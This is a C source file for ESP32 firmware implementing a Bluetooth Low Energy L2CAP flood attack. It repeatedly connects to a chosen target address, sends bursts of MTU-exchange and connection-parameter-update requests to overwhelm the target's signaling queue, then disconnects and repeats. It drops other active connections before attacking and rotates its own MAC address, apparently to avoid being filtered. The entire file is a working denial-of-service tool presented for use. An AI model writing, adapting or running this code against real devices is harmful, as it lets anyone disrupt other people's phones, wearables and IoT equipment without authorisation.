/*
 * ble_l2cap_flood.c - BLE L2CAP Flood Attack Implementation
 *
 * Connects to a target BLE device and rapidly sends L2CAP signaling
 * commands (MTU exchange, connection parameter updates) to overwhelm
 * the target's L2CAP processing queue.  After the signaling burst,
 * the connection is terminated and the cycle repeats.
 *
 * Thread safety:
 *   - `running` is volatile bool: set from stop()/timer, read in task
 *   - Counters are volatile uint32_t: atomic on 32-bit Xtensa
 *   - `cfg` is protected by mutex
 *   - `timeout_fired` is volatile for cross-task visibility
 *
 * Async flow:
 *   The GAP event callback NEVER calls vTaskDelay (which would block
 *   the entire NimBLE host task).  Instead it updates counters and
 *   gives `conn_done_sem` to wake the flood task, which then applies
 *   the appropriate delay before the next attempt.
 *
 * L2CAP signaling burst:
 *   After a successful GAP connection, the flood task rapidly calls:
 *     - ble_att_mtu_exchange()   → forces target to process MTU request
 *     - ble_gap_conn_param_update() → forces Connection Param Update
 *   These generate L2CAP signaling PDUs on CID 0x0005 that the target
 *   must parse, evaluate, and respond to — exhausting its L2CAP queue.
 *
 * Dependencies:
 *   - ble_common.h  (nimble_port_init + own_addr_type helper)
 *   - NimBLE stack  (host + controller)
 *   - FreeRTOS
 *   - cJSON
 *   - esp_timer
 */

#include "ble_l2cap_flood.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "cJSON.h"
#include <string.h>

/* NimBLE headers */
#include "nimble/nimble_port.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/ble_att.h"

#include "ble_common.h"

/* ================================================================== */
/*  Constants                                                          */
/* ================================================================== */

static const char *TAG = "ble_l2cap_flood";

#define DEFAULT_TIMEOUT_SEC          300
#define DEFAULT_CONNECT_TIMEOUT_MS   5000
#define DEFAULT_SIGNAL_BURST_COUNT   50
#define DEFAULT_SIGNAL_INTERVAL_MS   10
#define DEFAULT_POST_DISCONNECT_MS   500
#define DEFAULT_FAIL_BACKOFF_MS      2000
#define DEFAULT_ADDR_TYPE            BLE_L2CAP_ADDR_AUTO
#define DEFAULT_ROTATE_OWN_MAC       true
#define STOP_SEM_TIMEOUT_MS          5000
#define CONN_DONE_TIMEOUT_MS         10000
#define TASK_STACK_SIZE              4096
#define TASK_PRIORITY                5

/* ================================================================== */
/*  Module state                                                       */
/* ================================================================== */

/* Control */
static volatile bool running           = false;
static SemaphoreHandle_t mutex         = NULL;
static SemaphoreHandle_t task_exit_sem = NULL;
static SemaphoreHandle_t conn_done_sem = NULL;
static TaskHandle_t task_handle        = NULL;

/* Timeout timer */
static esp_timer_handle_t timeout_timer = NULL;
static volatile bool timeout_fired      = false;

/* Timing */
static volatile int64_t start_time_ms  = 0;

/* Counters (atomic on 32-bit Xtensa) */
static volatile uint32_t attempt_count  = 0;
static volatile uint32_t success_count  = 0;
static volatile uint32_t fail_count     = 0;
static volatile uint32_t signal_count   = 0;

/* Connection state (written by callback, read by task) */
static volatile bool last_success      = false;
static volatile int  last_conn_handle  = -1;
static volatile uint8_t active_addr_type = BLE_ADDR_PUBLIC;

/* Configuration (protected by mutex) */
static ble_l2cap_flood_config_t cfg = {
    .target_addr         = "",
    .timeout_sec         = DEFAULT_TIMEOUT_SEC,
    .connect_timeout_ms  = DEFAULT_CONNECT_TIMEOUT_MS,
    .signal_burst_count  = DEFAULT_SIGNAL_BURST_COUNT,
    .signal_interval_ms  = DEFAULT_SIGNAL_INTERVAL_MS,
    .post_disconnect_ms  = DEFAULT_POST_DISCONNECT_MS,
    .fail_backoff_ms     = DEFAULT_FAIL_BACKOFF_MS,
    .addr_type           = DEFAULT_ADDR_TYPE,
    .rotate_own_mac      = DEFAULT_ROTATE_OWN_MAC,
};

/* Aggressive connection parameters — short intervals for rapid cycling */
static const struct ble_gap_conn_params conn_params = {
    .scan_itvl           = 0x0010,   /* 10 ms scan interval    */
    .scan_window         = 0x0010,   /* 10 ms scan window      */
    .itvl_min            = 0x0006,   /* 7.5 ms (spec minimum)  */
    .itvl_max            = 0x000C,   /* 15 ms                  */
    .latency             = 0,
    .supervision_timeout = 0x0064,   /* 1 s — short, we'll kill it fast */
    .min_ce_len          = 0,
    .max_ce_len          = 0,
};

/* ================================================================== */
/*  Helpers                                                            */
/* ================================================================== */

/** Generate a BLE random static address (top 2 bits = 11). */
static void generate_random_addr(uint8_t addr[6])
{
    esp_fill_random(addr, 6);
    /* BLE spec: random static address has bits 1:0 of byte 5 set to 11 */
    addr[5] |= 0xC0;
}

/** Parse "AA:BB:CC:DD:EE:FF" -> NimBLE little-endian byte array. */
static void addr_from_str(const char *s, uint8_t out[6])
{
    int vals[6] = {0};
    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
               &vals[0], &vals[1], &vals[2],
               &vals[3], &vals[4], &vals[5]) == 6) {
        /* NimBLE stores addresses in little-endian (reversed) order */
        for (int i = 0; i < 6; i++) {
            out[i] = (uint8_t)vals[5 - i];
        }
    } else {
        memset(out, 0, 6);
    }
}

/** Return the addr type string for logging. */
static const char *addr_type_str(uint8_t type)
{
    return (type == BLE_ADDR_PUBLIC) ? "PUBLIC" : "RANDOM";
}

/* ================================================================== */
/*  Timeout timer callback                                             */
/* ================================================================== */

static void timeout_timer_cb(void *arg)
{
    ESP_LOGW(TAG, "Timeout reached (%u s) -- stopping L2CAP flood",
             (unsigned)cfg.timeout_sec);
    timeout_fired = true;
    running       = false;
}

/* ================================================================== */
/*  GAP event callback  (NO vTaskDelay -- runs in NimBLE host context) */
/* ================================================================== */

static int conn_event_cb(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {

    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            /* ---- Connection succeeded ---- */
            success_count++;
            last_success     = true;
            last_conn_handle = event->connect.conn_handle;
            ESP_LOGI(TAG, "Connected! handle=%d  (success=%u)",
                     event->connect.conn_handle,
                     (unsigned)success_count);

            /*
             * Do NOT terminate here — let the flood task send the
             * L2CAP signaling burst first, then it will terminate.
             * Signal conn_done_sem so the task knows we're connected.
             */
            if (conn_done_sem) {
                xSemaphoreGive(conn_done_sem);
            }
        } else {
            /* ---- Connection failed ---- */
            fail_count++;
            last_success     = false;
            last_conn_handle = -1;
            ESP_LOGW(TAG, "Connect failed: status=%d  (fails=%u)",
                     event->connect.status, (unsigned)fail_count);

            /* Status 13 = wrong address type -> auto-switch */
            if (event->connect.status == 13 &&
                cfg.addr_type == BLE_L2CAP_ADDR_AUTO) {
                active_addr_type = (active_addr_type == BLE_ADDR_PUBLIC)
                    ? BLE_ADDR_RANDOM : BLE_ADDR_PUBLIC;
                ESP_LOGI(TAG, "Status 13 -> switching to %s",
                         addr_type_str(active_addr_type));
            }

            /* Failed connect: no DISCONNECT event coming -> signal now */
            if (conn_done_sem) {
                xSemaphoreGive(conn_done_sem);
            }
        }
        break;

    case BLE_GAP_EVENT_DISCONNECT:
        ESP_LOGI(TAG, "Disconnected; reason=%d", event->disconnect.reason);
        last_conn_handle = -1;
        /* Connection fully released -> signal flood task */
        if (conn_done_sem) {
            xSemaphoreGive(conn_done_sem);
        }
        break;

    case BLE_GAP_EVENT_CONN_UPDATE:
        /* Ignore parameter update results during flood */
        break;

    case BLE_GAP_EVENT_MTU:
        ESP_LOGD(TAG, "MTU update: conn_handle=%d mtu=%d",
                 event->mtu.conn_handle, event->mtu.value);
        break;

    default:
        break;
    }
    return 0;
}

/* ================================================================== */
/*  L2CAP signaling burst                                              */
/* ================================================================== */

/**
 * Fire a burst of L2CAP signaling commands on an active connection.
 *
 * Each call to ble_att_mtu_exchange() and ble_gap_conn_param_update()
 * generates an L2CAP signaling PDU on CID 0x0005 that the target
 * must parse, evaluate, and respond to.  Rapidly repeating this
 * overwhelms the target's L2CAP processing queue.
 */
static void l2cap_signal_burst(uint16_t conn_handle)
{
    uint32_t burst = cfg.signal_burst_count;
    uint32_t interval = cfg.signal_interval_ms;

    ESP_LOGI(TAG, "Starting L2CAP signal burst: %u signals @ %u ms interval",
             (unsigned)burst, (unsigned)interval);

    for (uint32_t i = 0; i < burst && running; i++) {
        if (last_conn_handle < 0) {
            /* Connection was lost mid-burst */
            ESP_LOGW(TAG, "Connection lost during signal burst at signal %u",
                     (unsigned)i);
            break;
        }

        /*
         * Alternate between MTU exchange and connection parameter
         * update requests to hit different L2CAP signaling paths.
         */
        if (i % 2 == 0) {
            /* MTU exchange request — forces target to negotiate MTU */
            int rc = ble_gattc_exchange_mtu(conn_handle, NULL, NULL);
            if (rc == 0) {
                signal_count++;
            } else {
                ESP_LOGD(TAG, "ble_gattc_exchange_mtu failed: %d", rc);
                /* Non-fatal: target may reject, but the L2CAP PDU was
                 * still generated and the target still had to process it */
                signal_count++;
            }
        } else {
            /* Connection parameter update request with varied params.
             * Each request forces the target to evaluate the parameters
             * and send a response — consuming L2CAP processing time. */
            struct ble_gap_upd_params update_params = {
                .itvl_min     = 0x0006 + (i % 8),  /* Vary slightly */
                .itvl_max     = 0x000C + (i % 8),
                .latency      = 0,
                .supervision_timeout = 0x0064,
                .min_ce_len   = 0,
                .max_ce_len   = 0,
            };
            int rc = ble_gap_update_params(conn_handle, &update_params);
            if (rc == 0) {
                signal_count++;
            } else {
                ESP_LOGD(TAG, "ble_gap_update_params failed: %d", rc);
                /* Non-fatal: the L2CAP signaling PDU was still generated */
                signal_count++;
            }
        }

        /* Small delay between signals to avoid NimBLE host rejection */
        if (interval > 0) {
            vTaskDelay(pdMS_TO_TICKS(interval));
        }
    }

    ESP_LOGI(TAG, "Signal burst complete (total signals=%u)",
             (unsigned)signal_count);
}

/* ================================================================== */
/*  Flood task                                                         */
/* ================================================================== */

static void l2cap_flood_task(void *arg)
{
    ESP_LOGI(TAG, "L2CAP flood task started -> target %s", cfg.target_addr);

    /* Kill any existing BLE connections (e.g. phone) before attacking */
    ble_common_disconnect_all();
    vTaskDelay(pdMS_TO_TICKS(1000));

    while (running) {
        /* ---- Don't overlap GAP procedures ---- */
        if (ble_gap_conn_active()) {
            vTaskDelay(pdMS_TO_TICKS(200));
            continue;
        }
        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        if (ble_gap_disc_active()) {
            ble_gap_disc_cancel();
            vTaskDelay(pdMS_TO_TICKS(200));
        }

        /* ---- Optional: rotate our own MAC ---- */
        if (cfg.rotate_own_mac) {
            uint8_t rnd_addr[6];
            generate_random_addr(rnd_addr);
            int rc = ble_hs_id_set_rnd(rnd_addr);
            if (rc != 0) {
                ESP_LOGD(TAG, "ble_hs_id_set_rnd failed: %d (non-fatal)", rc);
            }
        }

        /* ---- Determine address type ---- */
        uint8_t use_addr_type = active_addr_type;
        if (cfg.addr_type == BLE_L2CAP_ADDR_PUBLIC) {
            use_addr_type = BLE_ADDR_PUBLIC;
        } else if (cfg.addr_type == BLE_L2CAP_ADDR_RANDOM) {
            use_addr_type = BLE_ADDR_RANDOM;
        }
        /* BLE_L2CAP_ADDR_AUTO -> use active_addr_type (may flip on status 13) */

        /* ---- Build peer address ---- */
        xSemaphoreTake(mutex, portMAX_DELAY);
        char copy[32];
        strncpy(copy, cfg.target_addr, sizeof(copy) - 1);
        copy[sizeof(copy) - 1] = '\0';
        xSemaphoreGive(mutex);

        uint8_t addr_val[6];
        addr_from_str(copy, addr_val);

        ble_addr_t peer;
        peer.type = use_addr_type;
        memcpy(peer.val, addr_val, 6);

        /* ---- Determine own address type ---- */
        uint8_t own_addr_type;
        if (cfg.rotate_own_mac) {
            own_addr_type = BLE_ADDR_RANDOM;
        } else {
            own_addr_type = ble_common_own_addr_type();
        }

        ESP_LOGI(TAG, "Attempting connect to %s (peer=%s, own=%s, attempt=%u)",
                 copy,
                 addr_type_str(use_addr_type),
                 cfg.rotate_own_mac ? "RANDOM(rotated)" : addr_type_str(own_addr_type),
                 (unsigned)(attempt_count + 1));

        /* ---- Initiate connection ---- */
        last_conn_handle = -1;
        int rc = ble_gap_connect(own_addr_type, &peer,
                                 cfg.connect_timeout_ms,
                                 &conn_params, conn_event_cb, NULL);

        if (rc == 0) {
            /* Connection initiated -- wait for callback to signal */
            attempt_count++;

            /* Wait for CONNECT event (success or failure) */
            if (conn_done_sem) {
                if (xSemaphoreTake(conn_done_sem,
                                   pdMS_TO_TICKS(CONN_DONE_TIMEOUT_MS))
                    != pdTRUE) {
                    ESP_LOGW(TAG, "Timed out waiting for connect result");
                    /* Continue to next attempt */
                    vTaskDelay(pdMS_TO_TICKS(cfg.fail_backoff_ms));
                    continue;
                }
            }

            if (last_success && last_conn_handle >= 0) {
                /* ---- L2CAP signaling burst ---- */
                l2cap_signal_burst((uint16_t)last_conn_handle);

                /* ---- Terminate the connection ---- */
                if (last_conn_handle >= 0) {
                    int term_rc = ble_gap_terminate((uint16_t)last_conn_handle,
                                                    BLE_ERR_REM_USER_CONN_TERM);
                    if (term_rc != 0 && term_rc != BLE_HS_ENOTCONN) {
                        ESP_LOGE(TAG, "ble_gap_terminate failed: %d", term_rc);
                    }
                }

                /* Wait for DISCONNECT event */
                if (conn_done_sem && last_conn_handle >= 0) {
                    if (xSemaphoreTake(conn_done_sem,
                                       pdMS_TO_TICKS(5000)) != pdTRUE) {
                        ESP_LOGW(TAG, "Timed out waiting for disconnect");
                    }
                }

                /* Post-disconnect cooldown */
                vTaskDelay(pdMS_TO_TICKS(cfg.post_disconnect_ms));
            } else {
                /* Connection failed -- backoff */
                vTaskDelay(pdMS_TO_TICKS(cfg.fail_backoff_ms));
            }
        } else {
            /* ble_gap_connect() itself failed */
            attempt_count++;
            fail_count++;

            if (rc == BLE_HS_EALREADY) {
                ESP_LOGD(TAG, "Connection already in progress");
                vTaskDelay(pdMS_TO_TICKS(500));
            } else if (rc == BLE_HS_EBUSY) {
                ESP_LOGD(TAG, "BLE host busy, waiting...");
                vTaskDelay(pdMS_TO_TICKS(1000));
            } else {
                ESP_LOGW(TAG, "ble_gap_connect returned %d", rc);
                vTaskDelay(pdMS_TO_TICKS(cfg.fail_backoff_ms));
            }
        }
    }

    /* ---- Task cleanup ---- */
    /* If a connection is still active, terminate it */
    if (last_conn_handle >= 0) {
        int term_rc = ble_gap_terminate((uint16_t)last_conn_handle,
                                        BLE_ERR_REM_USER_CONN_TERM);
        if (term_rc != 0 && term_rc != BLE_HS_ENOTCONN) {
            ESP_LOGW(TAG, "Connection still active at task exit (will time out)");
        }
    }

    ESP_LOGI(TAG, "L2CAP flood task exiting (attempts=%u, success=%u, fail=%u, signals=%u)",
             (unsigned)attempt_count,
             (unsigned)success_count,
             (unsigned)fail_count,
             (unsigned)signal_count);

    task_handle = NULL;
    if (task_exit_sem) {
        xSemaphoreGive(task_exit_sem);
    }
    vTaskDelete(NULL);
}

/* ================================================================== */
/*  Public API -- init                                                 */
/* ================================================================== */

void ble_l2cap_flood_init(void)
{
    if (mutex == NULL) {
        mutex = xSemaphoreCreateMutex();
    }
    if (task_exit_sem == NULL) {
        task_exit_sem = xSemaphoreCreateBinary();
    }
    if (conn_done_sem == NULL) {
        conn_done_sem = xSemaphoreCreateBinary();
    }

    /* Ensure BLE stack is ready */
    ble_common_init();

    ESP_LOGI(TAG, "ble_l2cap_flood initialized");
}

/* ================================================================== */
/*  Public API -- start                                                */
/* ================================================================== */

void ble_l2cap_flood_start_config(const ble_l2cap_flood_config_t *user_cfg)
{
    if (running) {
        ESP_LOGW(TAG, "Already running -- stop first");
        return;
    }
    if (mutex == NULL) {
        mutex = xSemaphoreCreateMutex();
    }

    /* Apply configuration */
    xSemaphoreTake(mutex, portMAX_DELAY);
    if (user_cfg) {
        memcpy(&cfg, user_cfg, sizeof(cfg));
    }
    /* Enforce sane defaults for zeroed fields */
    if (cfg.timeout_sec == 0)          cfg.timeout_sec         = DEFAULT_TIMEOUT_SEC;
    if (cfg.connect_timeout_ms == 0)   cfg.connect_timeout_ms  = DEFAULT_CONNECT_TIMEOUT_MS;
    if (cfg.signal_burst_count == 0)   cfg.signal_burst_count  = DEFAULT_SIGNAL_BURST_COUNT;
    if (cfg.signal_interval_ms == 0)   cfg.signal_interval_ms  = DEFAULT_SIGNAL_INTERVAL_MS;
    if (cfg.post_disconnect_ms == 0)   cfg.post_disconnect_ms  = DEFAULT_POST_DISCONNECT_MS;
    if (cfg.fail_backoff_ms == 0)      cfg.fail_backoff_ms     = DEFAULT_FAIL_BACKOFF_MS;
    xSemaphoreGive(mutex);

    /* Reset counters */
    attempt_count  = 0;
    success_count  = 0;
    fail_count     = 0;
    signal_count   = 0;
    timeout_fired  = false;
    last_success   = false;
    last_conn_handle = -1;
    start_time_ms  = esp_timer_get_time() / 1000;

    /* Set initial address type */
    switch (cfg.addr_type) {
    case BLE_L2CAP_ADDR_PUBLIC:
        active_addr_type = BLE_ADDR_PUBLIC;
        break;
    case BLE_L2CAP_ADDR_RANDOM:
        active_addr_type = BLE_ADDR_RANDOM;
        break;
    case BLE_L2CAP_ADDR_AUTO:
    default:
        active_addr_type = BLE_ADDR_PUBLIC;
        break;
    }

    /* ---- Start timeout timer ---- */
    if (timeout_timer != NULL) {
        esp_timer_stop(timeout_timer);
        esp_timer_delete(timeout_timer);
        timeout_timer = NULL;
    }
    const esp_timer_create_args_t timer_args = {
        .callback = timeout_timer_cb,
        .name     = "ble_l2cap_timeout",
    };
    esp_timer_create(&timer_args, &timeout_timer);
    esp_timer_start_once(timeout_timer, (int64_t)cfg.timeout_sec * 1000000);

    /* ---- Clear semaphores & start task ---- */
    running = true;

    if (task_exit_sem != NULL) {
        xSemaphoreTake(task_exit_sem, 0);   /* clear pending */
    }
    if (conn_done_sem != NULL) {
        xSemaphoreTake(conn_done_sem, 0);   /* clear pending */
    }

    BaseType_t ret = xTaskCreate(l2cap_flood_task, "ble_l2cap",
                                 TASK_STACK_SIZE, NULL,
                                 TASK_PRIORITY, &task_handle);
    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create L2CAP flood task");
        running = false;
        if (timeout_timer) {
            esp_timer_stop(timeout_timer);
            esp_timer_delete(timeout_timer);
            timeout_timer = NULL;
        }
    }
}

void ble_l2cap_flood_start(const char *target_addr)
{
    ble_l2cap_flood_config_t def = {
        .target_addr         = "",
        .timeout_sec         = DEFAULT_TIMEOUT_SEC,
        .connect_timeout_ms  = DEFAULT_CONNECT_TIMEOUT_MS,
        .signal_burst_count  = DEFAULT_SIGNAL_BURST_COUNT,
        .signal_interval_ms  = DEFAULT_SIGNAL_INTERVAL_MS,
        .post_disconnect_ms  = DEFAULT_POST_DISCONNECT_MS,
        .fail_backoff_ms     = DEFAULT_FAIL_BACKOFF_MS,
        .addr_type           = DEFAULT_ADDR_TYPE,
        .rotate_own_mac      = DEFAULT_ROTATE_OWN_MAC,
    };
    if (target_addr) {
        strncpy(def.target_addr, target_addr, sizeof(def.target_addr) - 1);
        def.target_addr[sizeof(def.target_addr) - 1] = '\0';
    }
    ble_l2cap_flood_start_config(&def);
}

/* ================================================================== */
/*  Public API -- stop                                                 */
/* ================================================================== */

void ble_l2cap_flood_stop(void)
{
    if (!running) return;

    running = false;

    /* Stop timeout timer */
    if (timeout_timer != NULL) {
        esp_timer_stop(timeout_timer);
        esp_timer_delete(timeout_timer);
        timeout_timer = NULL;
    }

    /* Wake the flood task if it's blocked on conn_done_sem */
    if (conn_done_sem) {
        xSemaphoreGive(conn_done_sem);
    }

    /* Wait for task to exit */
    if (task_exit_sem != NULL) {
        if (xSemaphoreTake(task_exit_sem,
                           pdMS_TO_TICKS(STOP_SEM_TIMEOUT_MS)) != pdTRUE) {
            ESP_LOGW(TAG, "Task exit timeout -- forcing delete");
            if (task_handle != NULL) {
                vTaskDelete(task_handle);
                task_handle = NULL;
            }
        }
    } else {
        vTaskDelay(pdMS_TO_TICKS(1000));
        if (task_handle != NULL) {
            vTaskDelete(task_handle);
            task_handle = NULL;
        }
    }

    ESP_LOGI(TAG, "L2CAP flood stopped (attempts=%u, success=%u, fail=%u, signals=%u, elapsed=%ds)",
             (unsigned)attempt_count,
             (unsigned)success_count,
             (unsigned)fail_count,
             (unsigned)signal_count,
             (int)ble_l2cap_flood_get_elapsed_sec());
}

/* ================================================================== */
/*  Public API -- status getters                                       */
/* ================================================================== */

bool ble_l2cap_flood_is_running(void)
{
    return running;
}

uint32_t ble_l2cap_flood_get_attempt_count(void)
{
    return attempt_count;
}

uint32_t ble_l2cap_flood_get_success_count(void)
{
    return success_count;
}

uint32_t ble_l2cap_flood_get_fail_count(void)
{
    return fail_count;
}

uint32_t ble_l2cap_flood_get_signal_count(void)
{
    return signal_count;
}

int32_t ble_l2cap_flood_get_elapsed_sec(void)
{
    if (start_time_ms == 0) return 0;
    int64_t now = esp_timer_get_time() / 1000;
    int32_t elapsed = (int32_t)((now - start_time_ms) / 1000);
    return (elapsed > 0) ? elapsed : 0;
}

int32_t ble_l2cap_flood_get_remaining_sec(void)
{
    if (!running) return 0;
    int32_t elapsed   = ble_l2cap_flood_get_elapsed_sec();
    int32_t timeout   = (int32_t)cfg.timeout_sec;
    int32_t remaining = timeout - elapsed;
    return (remaining > 0) ? remaining : 0;
}

bool ble_l2cap_flood_was_timeout(void)
{
    return timeout_fired;
}

cJSON *ble_l2cap_flood_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();

    cJSON_AddBoolToObject(root, "running", running);
    cJSON_AddNumberToObject(root, "attempt_count", (double)attempt_count);
    cJSON_AddNumberToObject(root, "success_count", (double)success_count);
    cJSON_AddNumberToObject(root, "fail_count",    (double)fail_count);
    cJSON_AddNumberToObject(root, "signal_count",  (double)signal_count);
    cJSON_AddNumberToObject(root, "elapsed_sec",   (double)ble_l2cap_flood_get_elapsed_sec());
    cJSON_AddNumberToObject(root, "remaining_sec",  (double)ble_l2cap_flood_get_remaining_sec());
    cJSON_AddBoolToObject(root,  "timeout", timeout_fired);

    xSemaphoreTake(mutex, portMAX_DELAY);
    cJSON_AddStringToObject(root, "target_addr", cfg.target_addr);
    cJSON_AddNumberToObject(root, "timeout_sec",         (double)cfg.timeout_sec);
    cJSON_AddNumberToObject(root, "connect_timeout_ms",   (double)cfg.connect_timeout_ms);
    cJSON_AddNumberToObject(root, "signal_burst_count",   (double)cfg.signal_burst_count);
    cJSON_AddNumberToObject(root, "signal_interval_ms",   (double)cfg.signal_interval_ms);
    cJSON_AddNumberToObject(root, "post_disconnect_ms",   (double)cfg.post_disconnect_ms);
    cJSON_AddNumberToObject(root, "fail_backoff_ms",      (double)cfg.fail_backoff_ms);

    const char *mode_str;
    switch (cfg.addr_type) {
    case BLE_L2CAP_ADDR_PUBLIC: mode_str = "PUBLIC";   break;
    case BLE_L2CAP_ADDR_RANDOM: mode_str = "RANDOM";   break;
    case BLE_L2CAP_ADDR_AUTO:   mode_str = "AUTO";     break;
    default:                    mode_str = "UNKNOWN";  break;
    }
    cJSON_AddStringToObject(root, "addr_type", mode_str);
    cJSON_AddStringToObject(root, "active_addr_type",
                            addr_type_str(active_addr_type));
    cJSON_AddBoolToObject(root, "rotate_own_mac", cfg.rotate_own_mac);
    xSemaphoreGive(mutex);

    return root;
}
